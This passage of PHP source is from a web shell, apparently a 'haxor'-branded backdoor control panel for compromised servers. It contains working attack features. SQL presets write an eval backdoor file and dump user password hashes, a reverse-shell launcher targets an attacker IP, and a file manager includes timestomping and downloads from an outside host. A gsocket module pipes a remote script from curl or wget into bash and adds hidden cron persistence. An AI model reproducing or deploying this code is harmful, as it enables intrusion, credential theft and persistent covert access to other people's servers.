            $sqlname = 'mysql';
            $sqlcode = 'select version();';
            $names = 'gbk';
        }
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="sql">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo '<tr><td>Support type</td><td>';
        $dbs = array('MySql', 'MsSql', 'Oracle', 'PostgreSql');
        foreach ($dbs as $dbname) {
            echo '<label><input type="radio" name="type" value="' . $dbname . '"' . ($type == $dbname ? ' checked' : '') . '>' . $dbname . '</label> ';
        }
        echo '</td></tr><tr><td>Connection</td><td>Address <input type="text" name="sqlhost" style="width:188px;" value="' . $sqlhost . '"> ';
        echo 'User <input type="text" name="sqluser" style="width:108px;" value="' . $sqluser . '"> ';
        echo 'Password <input type="text" name="sqlpass" style="width:108px;" value="' . $sqlpass . '"> ';
        echo 'DB Name <input type="text" name="sqlname" style="width:108px;" value="' . $sqlname . '"></td></tr>';
        echo '<tr><td>Statement<br>';
        echo '<select onchange="$(\'sqlcode\').value=options[selectedIndex].value">';
        echo '<option value="select version();">---Statement set---</option>';
        echo '<option value="select \'<?php eval ($_POST[cmd]);?>\' into outfile \'D:/web/shell.php\';">Write file</option>';
        echo '<option value="GRANT ALL PRIVILEGES ON *.* TO \'' . $sqluser . '\'@\'%\' IDENTIFIED BY \'' . $sqlpass . '\' WITH GRANT OPTION;">Open external connection</option>';
        echo '<option value="show variables;">System variable</option>';
        echo '<option value="create database haxor;">Create database</option>';
        echo '<option value="create table `haxor` (`id` INT(10) NOT NULL ,`user` VARCHAR(32) NOT NULL ,`pass` VARCHAR(32) NOT NULL) TYPE = MYISAM;">Create data table</option>';
        echo '<option value="show databases;">Show database</option>';
        echo '<option value="show tables from `' . $sqlname . '`;">Show data sheet</option>';
        echo '<option value="show columns from `haxor`;">Show table structure</option>';
        echo '<option value="drop table `haxor`;">Delete data table</option>';
        echo '<option value="select username,password,salt,email from `pre_ucenter_members` limit 0,30;">Display field</option>';
        echo '<option value="insert into `admin` (`user`,`pass`) values (\'haxor\', \'f1a81d782dea6a19bdca383bffe68452\');">Insert data</option>';
        echo '<option value="update `admin` set `user` = \'mi77i\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'haxor\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">Change data</option>';
        echo '<option value="t00lsa \'discuzx25\' t00lsb \'pre_ucenter_members\' t00lsc \'username,password,salt,email\' t00lsfile \'' . THISDIR . 'out.txt\';">Off the DB (MySql)</option>';
        echo '</select>';
        echo '</td><td><textarea name="sqlcode" id="sqlcode" style="width:680px;height:80px;">' . htmlspecialchars($sqlcode) . '</textarea></td></tr>';
        echo '<tr><td>Action</td><td><select name="names">';
        $charsets = array('gbk', 'utf8', 'big5', 'latin1', 'cp866', 'ujis', 'euckr', 'koi8r', 'koi8u');
        foreach ($charsets as $charset) {
            echo '<option value="' . $charset . '"' . ($names == $charset ? ' selected' : '') . '>' . $charset . '</option>';
        }
        echo '</select> <input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo '</table></form>';
        if ($rows) {
            echo '<pre style="padding:5px;background:#F8F8F8;text-align:left;">';
            ob_start();
            print_r($rows);
            $out = ob_get_contents();
            ob_end_clean();
            if (preg_match('~[\\x{4e00}-\\x{9fa5}]+~u', $out) && function_exists('iconv')) {
                $out = @iconv('UTF-8', 'GB2312//IGNORE', $out);
            }
            echo htmlspecialchars($out);
            echo '</pre>';
        }
        break;
    case "backshell":
        if (!empty($_POST['backip']) && !empty($_POST['backport'])) {
            $backip = $_POST['backip'];
            $backport = $_POST['backport'];
            $temp = $_POST['temp'] ? $_POST['temp'] : '/tmp';
            $type = $_POST['type'];
            $msg = backshell($backip, $backport, $temp, $type);
        } else {
            $backip = $_SERVER['REMOTE_ADDR'];
            $backport = '443';
            $temp = '/tmp';
            $type = 'pl';
        }
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form method="POST">';
        subeval();
        echo '<input type="hidden" name="go" id="go" value="backshell">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo '<tr><td>Bind address</td><td><input type="text" name="backip" style="width:268px;" value="' . $backip . '"> (Your ip)</td></tr>';
        echo '<tr><td>Bind port</td><td><input type="text" name="backport" style="width:268px;" value="' . $backport . '"> (nc -vvlp ' . $backport . ')</td></tr>';
        echo '<tr><td>Temporary directory</td><td><input type="text" name="temp" style="width:268px;" value="' . $temp . '"> (Only Linux)</td></tr>';
        echo '<tr><td>Rebound method</td><td>';
        $types = array('pl' => 'Perl', 'py' => 'Python', 'c' => 'C-bin', 'pcntl' => 'Pcntl', 'php' => 'PHP', 'phpwin' => 'PHP-WS');
        foreach ($types as $key => $name) {
            echo '<label><input type="radio" name="type" value="' . $key . '"' . ($key == $type ? ' checked' : '') . '>' . $name . '</label> ';
        }
        echo '</td></tr><tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo '</table></form>';
        break;
    case "edit":
    case "editor":
        $file = strdir($_POST['godir'] . '/' . $_POST['govar']);
        $iconv = function_exists('iconv');
        if (!file_exists($file)) {
            $msg = '[Create new file]';
        } else {
            $code = filer($file);
            $chst = 'Default';
            if (preg_match('~[\\x{4e00}-\\x{9fa5}]+~u', $code) && $iconv) {
                $chst = 'utf-8';
                $code = @iconv('UTF-8', 'GB2312//IGNORE', $code);
            }
            $size = size(filesize($file));
            $msg = '[File Permission: ' . substr(decoct(fileperms($file)), -4) . '] [File size: ' . $size . '] [File encoding: ' . $chst . ']';
        }
        echo base64_decode('PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQp2YXIgbiA9IDA7DQpmdW5jdGlvbiBzZWFyY2goc3RyKSB7DQoJdmFyIHR4dCwgaSwgZm91bmQ7DQoJaWYoc3RyID09ICIiKSByZXR1cm4gZmFsc2U7DQoJdHh0ID0gJCgnZmlsZWNvZGUnKS5jcmVhdGVUZXh0UmFuZ2UoKTsNCglmb3IoaSA9IDA7IGkgPD0gbiAmJiAoZm91bmQgPSB0eHQuZmluZFRleHQoc3RyKSkgIT0gZmFsc2U7IGkrKyl7DQoJCXR4dC5tb3ZlU3RhcnQoImNoYXJhY3RlciIsIDEpOw0KCQl0eHQubW92ZUVuZCgidGV4dGVkaXQiKTsNCgl9DQoJaWYoZm91bmQpeyB0eHQubW92ZVN0YXJ0KCJjaGFyYWN0ZXIiLCAtMSk7IHR4dC5maW5kVGV4dChzdHIpOyB0eHQuc2VsZWN0KCk7IHR4dC5zY3JvbGxJbnRvVmlldygpOyBuKys7IH0NCgllbHNlIHsgaWYgKG4gPiAwKSB7IG4gPSAwOyBzZWFyY2goc3RyKTsgfSBlbHNlIGFsZXJ0KHN0ciArICIuLi4gTm90LUZpbmQiKTsgfQ0KCXJldHVybiBmYWxzZTsNCn0NCjwvc2NyaXB0Pg==');
        echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"><input type="button" value="Find content" onclick="search($(\'keyword\').value);"> - ' . $msg . '</div>';
        echo '<form name="editfrm" id="editfrm" method="POST">';
        subeval();
        echo '<input type="hidden" name="go" value=""><input type="hidden" name="act" id="act" value="edit">';
        echo '<input type="hidden" name="dir" id="dir" value="' . dirname($file) . '">';
        echo '<div class="actall">File <input type="text" name="filename" value="' . $file . '" style="width:528px;"> ';
        if ($iconv) {
            echo 'Coding <select name="tostr">';
            $selects = array('normal' => 'Default', 'utf' => 'utf-8');
            foreach ($selects as $var => $name) {
                echo '<option value="' . $var . '"' . ($name == $chst ? ' selected' : '') . '>' . $name . '</option>';
            }
            echo '</select>';
        }
        echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">' . htmlspecialchars($code) . '</textarea></div></form>';
        echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="Save" style="width:80px;"> ';
        echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' . dirname($file) . '">';
        subeval();
        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Back" style="width:80px;"></form></div>';
        break;
    case "upfiles":
        $updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST['godir'];
        $msg = '[Maximum upload file ' . get_cfg_var("upload_max_filesize") . '] [POST maximum submitted data ' . get_cfg_var("post_max_size") . ']';
        $max = 10;
        if (isset($_FILES['uploads']) && isset($_POST['renames'])) {
            $uploads = $_FILES['uploads'];
            $msgs = array();
            for ($i = 1; $i < $max; $i++) {
                if ($uploads['error'][$i] == UPLOAD_ERR_OK) {
                    $rename = $_POST['renames'][$i] == '' ? $uploads['name'][$i] : $_POST['renames'][$i];
                    $filea = $uploads['tmp_name'][$i];
                    $fileb = strdir($updir . '/' . $rename);
                    $msgs[$i] = fileu($filea, $fileb) ? '<br><h2>Uploaded successfully ' . $rename . '</h2>' : '<br><h1>Upload failed ' . $rename . '</h1>';
                }
            }
        }
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
        subeval();
        echo '<input type="hidden" name="go" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
        echo '<div class="actall"><p>Upload to directory <input type="text" name="updir" style="width:398px;" value="' . $updir . '"></p>';
        for ($i = 1; $i < $max; $i++) {
            echo '<p>File' . $i . ' <input type="file" name="uploads[' . $i . ']" style="width:300px;"> Rename <input type="text" name="renames[' . $i . ']" style="width:128px;"> ' . $msgs[$i] . '</p>';
        }
        echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="Upload" style="width:80px;"> ';
        echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' . $updir . '">';
        subeval();
        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Back" style="width:80px;"></form></div>';
        break;
    default:
        if (isset($_FILES['upfile'])) {
            if ($_FILES['upfile']['name'] == '') {
                $msg = '<h1>Please select file</h1>';
            } else {
                $rename = $_POST['rename'] == '' ? $_FILES['upfile']['name'] : $_POST['rename'];
                $filea = $_FILES['upfile']['tmp_name'];
                $fileb = strdir($nowdir . $rename);
                $msg = fileu($filea, $fileb) ? '<h2>Upload files ' . $rename . ' Success</h2>' : '<h1>Upload files ' . $rename . ' Failure</h1>';
            }
        }
        if (isset($_POST['act'])) {
            switch ($_POST['act']) {
                case "a":
                    if (!$_POST['files']) {
                        $msg = '<h1>Please select file ' . $_POST['var'] . '</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @copy(strdir($nowdir . $filename), strdir($_POST['var'] . '/' . $filename)) ? 1 : 0;
                        }
                        $msg = $msg = $i ? '<h2>Co-copy ' . $i . ' Files to' . $_POST['var'] . 'Success</h2>' : '<h1>Co-copy ' . $i . ' Files to' . $_POST['var'] . 'Failure</h1>';
                    }
                    break;
                case "b":
                    if (!$_POST['files']) {
                        $msg = '<h1>Please select file</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @unlink(strdir($nowdir . $filename)) ? 1 : 0;
                        }
                        $msg = $i ? '<h2>Altogether deleted! ' . $i . ' Files succeeded</h2>' : '<h1>Altogether deleted! ' . $i . ' Files failed</h1>';
                    }
                    break;
                case "c":
                    if (!$_POST['files']) {
                        $msg = '<h1>Please select file ' . $_POST['var'] . '</h1>';
                    } elseif (!ereg("^[0-7]{4}\$", $_POST['var'])) {
                        $msg = '<h1>Permision value error</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @chmod(strdir($nowdir . $filename), base_convert($_POST['var'], 8, 10)) ? 1 : 0;
                        }
                        $msg = $i ? '<h2>Total ' . $i . ' File modification permission are' . $_POST['var'] . 'Success</h2>' : '<h1>Total ' . $i . ' File modification permission are' . $_POST['var'] . 'Failure</h1>';
                    }
                    break;
                case "d":
                    if (!$_POST['files']) {
                        $msg = '<h1>Please select file ' . $_POST['var'] . '</h1>';
                    } elseif (!preg_match('/(\\d+)-(\\d+)-(\\d+) (\\d+):(\\d+):(\\d+)/', $_POST['var'])) {
                        $msg = '<h1>Wrong time format ' . $_POST['var'] . '</h1>';
                    } else {
                        $i = 0;
                        foreach ($_POST['files'] as $filename) {
                            $i += @touch(strdir($nowdir . $filename), strtotime($_POST['var'])) ? 1 : 0;
                        }
                        $msg = $i ? '<h2>Total ' . $i . ' Files modified at' . $_POST['var'] . 'Success</h2>' : '<h1>Total ' . $i . ' Files modified at' . $_POST['var'] . 'Failure</h1>';
                    }
                    break;
                case "e":
                    $path = strdir($nowdir . $_POST['var'] . '/');
                    if (file_exists($path)) {
                        $msg = '<h1>Directory already exists ' . $_POST['var'] . '</h1>';
                    } else {
                        $msg = @mkdir($path, 0777) ? '<h2>Create a directory ' . $_POST['var'] . ' Success</h2>' : '<h1>Create a directory ' . $_POST['var'] . ' Failure</h1>';
                    }
                    break;
                case "f":
                    $context = array('http' => array('timeout' => 30));
                    if (function_exists('stream_context_create')) {
                        $stream = stream_context_create($context);
                    }
                    $data = @file_get_contents($_POST['var'], false, $stream);
                    $filename = array_pop(explode('/', $_POST['var']));
                    if ($data) {
                        $msg = filew(strdir($nowdir . $filename), $data, 'wb') ? '<h2>Download ' . $filename . ' Success</h2>' : '<h1>Download ' . $filename . ' Failure</h1>';
                    } else {
                        $msg = '<h1>Download failed or download is not supported</h1>';
                    }
                    break;
                case "rf":
                    $files = explode('|x|', $_POST['var']);
                    if (count($files) != 2) {
                        $msg = '<h1>Input error</h1>';
                    } else {
                        $msg = @rename(strdir($nowdir . $files[1]), strdir($nowdir . $files[0])) ? '<h2>Rename ' . $files[1] . ' for ' . $files[0] . ' Success</h2>' : '<h1>Rename ' . $files[1] . ' for ' . $files[0] . ' Failure</h1>';
                    }
                    break;
                case "pd":
                    $files = explode('|x|', $_POST['var']);
                    if (count($files) != 2) {
                        $msg = '<h1>Input error</h1>';
                    } else {
                        $path = strdir($nowdir . $files[1]);
                        $msg = @chmod($path, base_convert($files[0], 8, 10)) ? '<h2>Modify' . $files[1] . 'Permission is' . $files[0] . 'Success</h2>' : '<h1>Modify' . $files[1] . 'Permission is' . $files[0] . 'Failure</h1>';
                    }
                    break;
                case "edit":
                    if (isset($_POST['filename']) && isset($_POST['filecode'])) {
                        if ($_POST['tostr'] == 'utf') {
                            $_POST['filecode'] = @iconv('GB2312//IGNORE', 'UTF-8', $_POST['filecode']);
                        }
                        $msg = filew($_POST['filename'], $_POST['filecode'], 'w') ? '<h2>Saved successfully ' . $_POST['filename'] . '</h2>' : '<h1>Save failed ' . $_POST['filename'] . '</h1>';
                    }
                    break;
                case "deltree":
                    $deldir = strdir($nowdir . $_POST['var'] . '/');
                    if (!file_exists($deldir)) {
                        $msg = '<h1>Total dir ' . $_POST['var'] . ' does not exist</h1>';
                    } else {
                        $msg = deltree($deldir) ? '<h2>Delete directory ' . $_POST['var'] . ' Success</h2>' : '<h1>Delete directory ' . $_POST['var'] . ' failure</h1>';
                    }
                    break;
                case "zip":
                    if (empty($_POST['files'])) {
                        $msg = '<h1>Please select files/dirs to compress</h1>';
                    } else {
                        $zipname = (isset($_POST['var']) && $_POST['var'] !== '') ? $_POST['var'] : ('archive_' . date('YmdHis') . '.zip');
                        if (!preg_match('/\.zip$/i', $zipname)) $zipname .= '.zip';
                        $zippath = strdir($nowdir . $zipname);
                        if (class_exists('ZipArchive')) {
                            $zip = new ZipArchive();
                            if ($zip->open($zippath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                                foreach ($_POST['files'] as $entry) {
                                    $ep = strdir($nowdir . $entry);
                                    if (is_dir($ep)) {
                                        $rit = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($ep, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
                                        foreach ($rit as $fi) {
                                            $fp = $fi->getRealPath();
                                            $rel = $entry . '/' . str_replace('\\', '/', substr($fp, strlen(rtrim($ep, '/\\')) + 1));
                                            $zip->addFile($fp, $rel);
                                        }
                                    } elseif (is_file($ep)) {
                                        $zip->addFile($ep, $entry);
                                    }
                                }
                                $zip->close();
                                $msg = '<h2>Compressed to ' . htmlspecialchars($zipname) . ' Success</h2>';
                            } else {
                                $msg = '<h1>Cannot create zip file</h1>';
                            }
                        } else {
                            $args = implode(' ', array_map('escapeshellarg', $_POST['files']));
                            $res = command('cd ' . escapeshellarg($nowdir) . ' && zip -r ' . escapeshellarg($zipname) . ' ' . $args, $nowdir);
                            $msg = file_exists($zippath) ? '<h2>Compressed to ' . htmlspecialchars($zipname) . ' Success</h2>' : '<h1>Compress failed: ' . htmlspecialchars((string)$res['res']) . '</h1>';
                        }
                    }
                    break;
                case "unzip":
                    $uzfile = strdir($nowdir . $_POST['var']);
                    if (!file_exists($uzfile)) {
                        $msg = '<h1>File not found: ' . htmlspecialchars($_POST['var']) . '</h1>';
                    } elseif (class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        $zr = $zip->open($uzfile);
                        if ($zr === true) {
                            $zip->extractTo($nowdir);
                            $zip->close();
                            $msg = '<h2>Extracted ' . htmlspecialchars($_POST['var']) . ' Success</h2>';
                        } else {
                            $msg = '<h1>Cannot open zip (code ' . $zr . ')</h1>';
                        }
                    } else {
                        $res = command('cd ' . escapeshellarg($nowdir) . ' && unzip -o ' . escapeshellarg($_POST['var']), $nowdir);
                        $msg = (strpos((string)$res['res'], 'inflating') !== false || strpos((string)$res['res'], 'extracting') !== false) ? '<h2>Extracted ' . htmlspecialchars($_POST['var']) . ' Success</h2>' : '<h1>Extract failed: ' . htmlspecialchars((string)$res['res']) . '</h1>';
                    }
                    break;
            }
        }
        $chmod = substr(decoct(fileperms($nowdir)), -4);
        if (!$chmod) {
            $msg .= ' - <h1>Cannot read directory</h1>';
        }
        $array = showdir($nowdir);
        $thisurl = strdir('/' . strtr($nowdir, array(ROOTDIR => '')) . '/');
        $nowdir = strtr($nowdir, array('\'' => '%27', '"' => '%22'));
        echo '<div class="msgbox">' . $msg . '</div>';
        echo '<div class="actall"><form name="frm" id="frm" method="POST">';
        subeval();
        echo (is_writable($nowdir) ? '<h2>Path</h2>' : '<h1>Path</h1>') . ' <input type="text" name="dir" id="dir" style="width:508px;" value="' . strdir($nowdir . '/') . '"> ';
        echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="Go"> ';
        echo '<input type="button" onclick="cd(\'' . ROOTDIR . '\');" style="width:68px;" value="Root dir"> ';
        echo '<input type="button" onclick="cd(\'' . THISDIR . '\');" style="width:68px;" value="Current dir"> ';
        echo '<select onchange="cd(options[selectedIndex].value);">';
        echo '<option>---Special Dir---</option>';
        echo '<option value="C:/RECYCLER/">Win-RECYCLER</option>';
        echo '<option value="C:/$Recycle.Bin/">Win-$Recycle</option>';
        echo '<option value="C:/Program Files/">Win-Program</option>';
        echo '<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup/">Win-Startup</option>';
        echo '<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动/">Win-Startup (CN)</option>';
        echo '<option value="C:/Windows/Temp/">Win-TEMP</option>';
        echo '<option value="/usr/local/">Linux-local</option>';
        echo '<option value="/tmp/">Linux-tmp</option>';
        echo '<option value="/var/tmp/">Linux-var</option>';
        echo '<option value="/etc/ssh/">Linux-ssh</option>';
        echo '</select></form></div><div class="actall">';
        echo '<input type="button" value="New file" onclick="nf(\'edit\',\'newfile.php\');" style="width:68px;"> ';
        echo '<input type="button" value="New Dir" onclick="txts(\'Directory name\',\'newdir\',\'e\');" style="width:68px;"> ';
        echo '<input type="button" value="Download" onclick="txts(\'Download the file to the current directory\',\'http://hax.or.id/indo.txt\',\'f\');" style="width:68px;"> ';
        echo '<input type="button" value="Bulk Up" onclick="go(\'upfiles\',\'' . $nowdir . '\');" style="width:68px;"> ';
        echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
        subeval();
        echo '<input type="hidden" name="dir" id="dir" value="' . $nowdir . '">';
        echo '<input type="file" name="upfile" style="width:286px;height:21px;"> ';
        echo '<input type="button" onclick="$(\'upfrm\').submit();" value="Upload" style="width:50px;"> ';
        echo 'Renamed to <input type="text" name="rename" style="width:128px;">';
        echo '</form></div>';
        echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
        subeval();
        echo '<input type="hidden" name="dir" id="dir" value="' . $nowdir . '">';
        echo '<input type="hidden" name="act" id="act" value="">';
        echo '<input type="hidden" name="var" id="var" value="">';
        echo '<th><a href="javascript:void(0);" onclick="cd(\'' . dirname($nowdir) . '/\');">Parent directory</a></th><th style="width:5%">Perm</th><th style="width:17%">Creation time</th><th style="width:17%">Last Changed</th><th style="width:8%">Size</th><th style="width:8%">Action</th>';
        if ($array) {
            if (isset($array['dir']) && is_array($array['dir'])) { asort($array['dir']); }
            if (isset($array['file']) && is_array($array['file'])) { asort($array['file']); }
            $dnum = $fnum = 0;
            foreach ((array)(isset($array['dir']) ? $array['dir'] : array()) as $path => $name) {
                $prem = substr(decoct(fileperms($path)), -4);
                $ctime = date('Y-m-d H:i:s', filectime($path));
                $mtime = date('Y-m-d H:i:s', filemtime($path));
                echo '<tr>';
                echo '<td><input type="checkbox" name="files[]" value="' . $name . '"><a href="javascript:void(0);" onclick="cd(\'' . $nowdir . $name . '\');"><b>' . strtr($name, array('%27' => '\'', '%22' => '"')) . '</b></a></td>';
                echo '<td><a href="javascript:void(0);" onclick="acts(\'' . $prem . '\',\'pd\',\'' . $name . '\');">' . $prem . '</a></td>';
                echo '<td>' . $ctime . '</td>';
                echo '<td>' . $mtime . '</td>';
                echo '<td>-</td>';
                echo '<td><a href="javascript:void(0);" onclick="dels(\'' . $name . '\');">Del</a> ';
                echo ' | <a href="javascript:void(0);" onclick="acts(\'' . $name . '\',\'rf\',\'' . $name . '\');">Ren</a></td>';
                echo '</tr>';
                $dnum++;
            }
            foreach ((array)(isset($array['file']) ? $array['file'] : array()) as $path => $name) {
                $prem = substr(decoct(fileperms($path)), -4);
                $ctime = date('Y-m-d H:i:s', filectime($path));
                $mtime = date('Y-m-d H:i:s', filemtime($path));
                $size = size(filesize($path));
                echo '<tr>';
                echo '<td><input type="checkbox" name="files[]" value="' . $name . '"><a href="javascript:void(0);" onclick="go(\'edit\',\'' . $name . '\');">' . strtr($name, array('%27' => '\'', '%22' => '"')) . '</a></td>';
                echo '<td><a href="javascript:void(0);" onclick="acts(\'' . $prem . '\',\'pd\',\'' . $name . '\');">' . $prem . '</a></td>';
                echo '<td>' . $ctime . '</td>';
                echo '<td>' . $mtime . '</td>';
                echo '<td align="right"><a href="javascript:void(0);" onclick="go(\'down\',\'' . $name . '\');">' . $size . '</a></td>';
                echo '<td><a target="_blank" href="' . $thisurl . $name . '">View</a> ';
                echo ' | <a href="javascript:void(0);" onclick="acts(\'' . $name . '\',\'rf\',\'' . $name . '\');">Ren</a>';
                if (preg_match('/\.zip$/i', $name)) {
                    echo ' | <a href="javascript:void(0);" onclick="unzipf(\'' . addslashes($name) . '\');">Unzip</a>';
                }
                echo '</td>';
                echo '</tr>';
                $fnum++;
            }
        }
        unset($array);
        echo '</table>';
        echo '<div class="actall" style="text-align:left;">';
        echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
        echo '<input type="button" value="Copy" style="width:50px;" onclick=\'txts("Copy path","' . $nowdir . '","a");\'> ';
        echo '<input type="button" value="Delete" style="width:50px;" onclick=\'dels("b");\'> ';
        echo '<input type="button" value="Perm" style="width:50px;" onclick=\'txts("Change Permission","0666","c");\'> ';
        echo '<input type="button" value="Time" style="width:50px;" onclick=\'txts("Change the time","' . $mtime . '","d");\'> ';
        echo '<input type="button" value="Zip" style="width:50px;" onclick="zipsel();"> ';
        echo '<input type="button" value="Download" style="width:68px;" onclick="dlsel();"> ';
        echo 'Total dir[' . $dnum . '] - Total file[' . $fnum . '] - Permission[' . $chmod . ']</div></form>';
        echo '<script>function zipsel(){var n=prompt("ZIP filename (blank=auto)","");if(n===null)return;$("var").value=n;$("act").value="zip";$("frm1").submit();}function unzipf(f){if(confirm("Extract "+f+" to current directory?")){$("var").value=f;$("act").value="unzip";$("frm1").submit();}}function dlsel(){var c=0,els=$("frm1").elements;for(var i=0;i<els.length;i++){if(els[i].name=="files[]"&&els[i].checked)c++;}if(!c){alert("Select at least one file or folder.");return;}$("act").value="dl";$("frm1").submit();}</script>';
        break;
    case "gsocket":
        if ($win) {
            echo '<div class="msgbox"><h1>GSocket key scanner is not available on Windows.</h1></div>';
            break;
        }
        $gsr = function($cmd) {
            $r = command($cmd . ' 2>/dev/null', THISDIR);
            return trim((string)$r['res']);
        };
        $gs_pu = function($pid) use ($gsr) {
            if (!$pid || !ctype_digit((string)$pid)) return '?';
            $u = $gsr('ps -o user= -p ' . (int)$pid);
            if ($u && strlen($u) < 64 && strpos($u, ' ') === false) return $u;
            $uid = $gsr("awk '/^Uid:/{print \$2}' /proc/" . (int)$pid . '/status');
            if (!ctype_digit((string)$uid)) return '?';
            return $gsr("getent passwd $uid | cut -d: -f1") ?: "uid:$uid";
        };
        // Handle Plant / Remove before scan (so scan reflects new state)
        $gs_action_msg = ''; $gs_action_out = ''; $gs_action_bg = ''; $gs_action_brd = '';
        $gs_plant_key = preg_replace('/[^A-Za-z0-9_\-]/', '', trim((string)($_POST['gs_key'] ?? '')));
        if (isset($_POST['gs_plant']) || isset($_POST['gs_remove'])) {
            if (!$gs_plant_key && isset($_POST['gs_plant'])) {
                $c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                $gs_plant_key = ''; for ($i = 0; $i < 20; $i++) $gs_plant_key .= $c[random_int(0, 61)];
            }
            if ($gs_plant_key) {
                $gk = $gs_plant_key;
                if (isset($_POST['gs_plant'])) {
                    $gmet = (string)($_POST['gs_method'] ?? 'curl'); $ol = array();
                    if ($gmet === 'wget') {
                        $gcmd = 'S="' . $gk . '" bash -c "$(wget -qO- https://gsocket.io/y)" 2>&1';
                    } elseif ($gmet === 'nohup') {
                        $gbin = trim($gsr('find $HOME/.config /tmp -maxdepth 5 -name defunct -type f 2>/dev/null | head -1') ?: '/tmp/.gs');
                        $gcmd = 'SS_SECRET=' . escapeshellarg($gk) . ' nohup ' . escapeshellarg($gbin) . ' -liqD > /dev/null 2>&1 & echo started';
                    } else {
                        $gcmd = 'S="' . $gk . '" bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
                    }
                    $ol[] = '$ ' . $gcmd; $ol[] = $gsr($gcmd) ?: '(no output)';
                    $cc = $gsr('crontab -l 2>/dev/null') ?: ''; $na = array();
                    if (isset($_POST['gs_persist_reboot'])) {
                        $er = '@reboot SS_SECRET=' . $gk . ' defunct -liqD';
                        if (strpos($cc, $er) === false) { $na[] = $er; $ol[] = '[cron] +@reboot'; }
                        else $ol[] = '[cron] @reboot already present';
                    }
                    if (isset($_POST['gs_persist_watch'])) {
                        $ew = '*/5 * * * * pgrep defunct >/dev/null 2>&1 || SS_SECRET=' . $gk . ' defunct -liqD';
                        if (strpos($cc, $gk) === false || strpos($cc, '*/5') === false) { $na[] = $ew; $ol[] = '[cron] +watchdog (*/5)'; }
                        else $ol[] = '[cron] watchdog already present';
                    }
                    if ($na) {
                        $tp = '/tmp/.cp' . mt_rand(100000, 999999);
                        file_put_contents($tp, $cc . "\n" . implode("\n", $na) . "\n");
                        $gsr('crontab ' . escapeshellarg($tp)); $gsr('rm -f ' . escapeshellarg($tp));
                    }
                    $gs_action_msg = '<h2>Plant executed &mdash; key: ' . htmlspecialchars($gk) . '</h2>';
                    $gs_action_out = implode("\n", $ol);
                    $gs_action_bg = '#F0FAF0'; $gs_action_brd = '#5A9A5A';
                } else {
                    $ol = array();
                    $ol[] = '[kill] pkill -f "' . $gk . '" -> ' . ($gsr('pkill -f ' . escapeshellarg($gk) . ' 2>&1; echo exit:$?') ?: 'no match');
                    $cc = $gsr('crontab -l 2>/dev/null') ?: '';
                    if ($cc) {
                        $kept = array(); $rem = array();
                        foreach (explode("\n", $cc) as $ln) {
                            if (strpos($ln, $gk) !== false) $rem[] = $ln; else $kept[] = $ln;
                        }
                        if ($rem) {
                            $tp = '/tmp/.cr' . mt_rand(100000, 999999);
                            file_put_contents($tp, implode("\n", $kept) . "\n");
                            $gsr('crontab ' . escapeshellarg($tp)); $gsr('rm -f ' . escapeshellarg($tp));
                            foreach ($rem as $rl) $ol[] = '[cron] removed: ' . $rl;
                        } else $ol[] = '[cron] no matching entries found';
                    } else $ol[] = '[cron] empty or not accessible';
                    if (isset($_POST['gs_rm_bin'])) {
                        $fr = $gsr("find \$HOME/.config /tmp /dev/shm -maxdepth 5 \\( -name 'defunct' -o -name '.gs' -o -name 'gs-netcat' -o -name '*.dat' \\) -type f 2>/dev/null");
                        $rmc = 0;
                        foreach (explode("\n", trim($fr)) as $fp) {
                            $fp = trim($fp); if (!$fp || !file_exists($fp)) continue;
                            $gsr('rm -f ' . escapeshellarg($fp)); $ol[] = '[rm] deleted ' . $fp; $rmc++;
                        }
                        if (!$rmc) $ol[] = '[rm] no binaries/keyfiles found';
                    } else $ol[] = '[skip] binary not removed (checkbox not ticked)';
                    $gs_action_msg = '<h2>Remove executed &mdash; key: ' . htmlspecialchars($gk) . '</h2>';
                    $gs_action_out = implode("\n", $ol);
                    $gs_action_bg = '#FFF8F8'; $gs_action_brd = '#AA5555';
                }
            } else {
                $gs_action_msg = '<h1>Error: no key specified</h1>';
